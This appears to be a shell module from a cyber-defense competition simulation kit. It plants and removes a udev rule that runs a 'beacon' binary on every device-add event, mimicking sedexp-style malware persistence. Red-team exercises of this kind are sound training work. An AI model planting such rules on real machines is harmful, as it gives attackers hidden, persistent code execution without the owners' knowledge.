# technique: udev RUN+= persistence, sedexp-style (guide 2.3)
name="udev-rule"
plant() {
    mkdir -p /etc/udev/rules.d
    echo 'ACTION=="add", RUN+="/usr/local/bin/ccdc-sim-beacon"' > /etc/udev/rules.d/99-ccdc-sim.rules
    udevadm control --reload 2>/dev/null
}
clean() {
    rm -f /etc/udev/rules.d/99-ccdc-sim.rules
    udevadm control --reload 2>/dev/null
}
